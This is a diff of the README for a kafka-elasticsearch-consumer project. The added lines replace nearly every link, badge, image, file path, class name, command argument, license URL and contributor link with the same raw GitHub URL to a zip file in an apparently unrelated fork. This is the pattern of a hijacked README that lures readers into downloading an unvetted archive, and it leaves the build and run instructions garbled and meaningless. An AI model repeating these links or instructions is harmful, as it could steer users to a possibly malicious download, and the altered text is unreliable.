@@ -1,11 +1,11 @@
-[![Build Status](https://travis-ci.org/BigDataDevs/kafka-elasticsearch-consumer.svg?branch=master)](https://travis-ci.org/BigDataDevs/kafka-elasticsearch-consumer)
-[ ![Download](https://api.bintray.com/packages/bigdatadevs/bigdatadevs-repo/kafka-elasticsearch-consumer/images/download.svg) ](https://bintray.com/bigdatadevs/bigdatadevs-repo/kafka-elasticsearch-consumer/_latestVersion)
+[![Build Status](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+[ ![Download](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip) ](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 
 # Welcome to the kafka-elasticsearch-standalone-consumer wiki!
 
 ## Architecture of the kafka-elasticsearch-standalone-consumer [indexer]
 
-![](img/IndexerV2Design.jpg)
+![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 
 
 # Introduction
@@ -19,19 +19,19 @@
 
 1. Download the code into a `$INDEXER_HOME` dir.
 
-2. `$INDEXER_HOME`/src/main/resources/config/kafka-es-indexer.properties file - update all relevant properties as explained in the comments.
+2. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - update all relevant properties as explained in the comments.
 
-3. `$INDEXER_HOME`/src/main/resources/config/logback.xml - specify directory you want to store logs in: `<property name="LOG_DIR" value="/tmp"/>`. Adjust values of max sizes and number of log files as needed.
+3. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - specify directory you want to store logs in: `<property name="LOG_DIR" value="/tmp"/>`. Adjust values of max sizes and number of log files as needed.
 
-4. `$INDEXER_HOME`/src/main/resources/config/kafka-es-indexer-start-options.config - consumer start options can be configured here (Start from earliest, latest, etc), more details inside a file.
+4. `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - consumer start options can be configured here (Start from earliest, latest, etc), more details inside a file.
 
-5. modify `$INDEXER_HOME`/src/main/resources/spring/kafka-es-context-public.xml if needed
+5. modify `$INDEXER_HOME`https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip if needed
 
 	If you want to use custom IMessageHandler class - specify it in the following config:
 	(make sure to only modify the class name, not the beans' name/scope)
 	
 	`<bean id="messageHandler"
-          class="org.elasticsearch.kafka.indexer.service.impl.examples.SimpleMessageHandlerImpl"
+          class="https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip"
           scope="prototype"/>`
 
 6. build the app:
@@ -40,14 +40,14 @@
 
     `./gradlew clean jar`
 
-    The **kafka-elasticsearch-consumer-0.0.2.0.jar** will be created in the `$INDEXER_HOME/build/libs/` dir.
+    The **https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip** will be created in the `$INDEXER_HOME/build/libs/` dir.
 
 7. make sure your `$JAVA_HOME` env variable is set (use JDK1.8 or above);
-	you may want to adjust JVM options and other values in the `gradlew` script and `gradle.properties` file
+	you may want to adjust JVM options and other values in the `gradlew` script and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` file
 
 8. run the app:
 
-	`./gradlew run -Dindexer.properties=$INDEXER_HOME/src/main/resources/config/kafka-es-indexer.properties -Dlogback.configurationFile=$INDEXER_HOME/src/main/resources/config/logback.xml`
+	`./gradlew run https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
  
 ### Running via generated scripts:
 
@@ -55,9 +55,9 @@
 * run: `./gradlew clean installDist`
 
 * `cd ./build/install/kafka-elasticsearch-consumer/bin` dir:
-![](img/build-dir.png)
+![](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 
-* run `./kafka-elasticsearch-consumer -Dindexer.properties=$INDEXER_HOME/src/main/resources/config/kafka-es-indexer.properties -Dlogback.configurationFile=$INDEXER_HOME/src/main/resources/config/logback.xml` script
+* run `./kafka-elasticsearch-consumer https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip$https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` script
 
 # Versions
 
@@ -69,20 +69,20 @@
 
 # Configuration
 
-Indexer application properties are specified in the kafka-es-indexer.properties file - you have to adjust properties for your env:
-[kafka-es-indexer.properties](src/main/resources/config/kafka-es-indexer.properties).
-You can specify you own properties file via `-Dindexer.properties=/abs-path/your-kafka-es-indexer.properties`
+Indexer application properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
+You can specify you own properties file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
 
-Logging properties are specified in the logback.xml file - you have to adjust properties for your env:
-[logback.xml](src/main/resources/config/logback.xml).
-You can specify your own logback config file via `-Dlogback.configurationFile=/abs-path/your-logback.xml` property
+Logging properties are specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file - you have to adjust properties for your env:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
+You can specify your own logback config file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` property
 
-Indexer application Spring configuration is specified in the kafka-es-context-public.xml:
-[kafka-es-context.xml](src/main/resources/spring/kafka-es-context-public.xml)
+Indexer application Spring configuration is specified in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
 
-Consumer start options configuration file is specified in kafka-es-indexer-start-options.config - by default `RESTART` option is used for all partitions:
-[kafka-es-indexer-start-options.config](src/main/resources/config/kafka-es-indexer-start-options.config).
-You can specify you own configuration file via `-Doffsets.config.path=/abs-path/your-kafka-es-indexer-start-options.config`
+Consumer start options configuration file is specified in https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip - by default `RESTART` option is used for all partitions:
+[https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip).
+You can specify you own configuration file via `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip`
 
 # Customization
 
@@ -97,21 +97,21 @@ Indexer application can be easily customized. The main areas for customizations 
 ## ES message handling customization 
 Message handling can be customized by implementing the IMessageHandler interface :
 
-* `org.elasticsearch.kafka.indexer.service.IMessageHandler` is an interface that defines main methods for reading events from Kafka, processing them, and bulk-intexing into ElasticSearch. One can implement all or some of the methods if custom behavior is needed. You can customize:
+* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` is an interface that defines main methods for reading events from Kafka, processing them, and bulk-intexing into ElasticSearch. One can implement all or some of the methods if custom behavior is needed. You can customize:
 * `transformMessage(...)` method to transform an event from one format into another;
 * `addEventToBatch(...)` method - adding an event to specified (or custom ) index, with or without routing info
 * `postToElasticSearch(...)` method - most likely you won't need to customize this
 
 To do this customization, you can implement the IMessageHandler interface and inject the `ElasticSearchBatchService` into your implementation class and delegate most of the methods to the ElasticSearchBatchService class. ElasticSearchBatchService gives you basic batching operations.
 
-See `org.elasticsearch.kafka.indexer.service.impl.examples.SimpleMessageHandlerImpl` for an example of such customization. 
+See `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` for an example of such customization. 
 
-* _**Don't forget to specify your custom message handler class in the kafka-es-context-public.xml file. By default, SimpleMessageHandlerImpl will be used**_
+* _**Don't forget to specify your custom message handler class in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. By default, SimpleMessageHandlerImpl will be used**_
 
 ## ES index name/type management customization 
 Index name and index type management/determination customization can be done by providing custom logic in your implementation of the IMessageHandler interface:
 
-* `org.elasticsearch.kafka.indexer.service.impl.examples.SimpleMessageHandlerImpl` uses `elasticsearch.index.name` and `elasticsearch.index.type` values as configured in the kafka-es-indexer.properties file. If you want to use custom logic - add it to the `addEventToBatch(...)` method
+* `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` uses `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` and `https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip` values as configured in the https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip file. If you want to use custom logic - add it to the `addEventToBatch(...)` method
 
 # Running as a Docker Container
 
@@ -125,7 +125,7 @@ kafka-elasticsearch-standalone-consumer
 	not use this file except in compliance with the License. You may obtain
 	a copy of the License at
 
-	     http://www.apache.org/licenses/LICENSE-2.0
+	     https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip
 
 	Unless required by applicable law or agreed to in writing,
 	software distributed under the License is distributed on an
@@ -136,8 +136,8 @@ kafka-elasticsearch-standalone-consumer
 
 # Contributors
 
- - [Krishna Raj](https://github.com/reachkrishnaraj)
- - [Marina Popova](https://github.com/ppine7)
- - [Dhyan Muralidharan](https://github.com/dhyan-yottaa)
- - [Andriy Pyshchyk](https://github.com/apysh)
- - [Vitalii Chernyak](https://github.com/merlin-zaraza)
+ - [Krishna Raj](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+ - [Marina Popova](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+ - [Dhyan Muralidharan](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+ - [Andriy Pyshchyk](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
+ - [Vitalii Chernyak](https://raw.githubusercontent.com/ducnguyenminh/kafka-elasticsearch-consumer/master/bargoose/kafka-elasticsearch-consumer.zip)
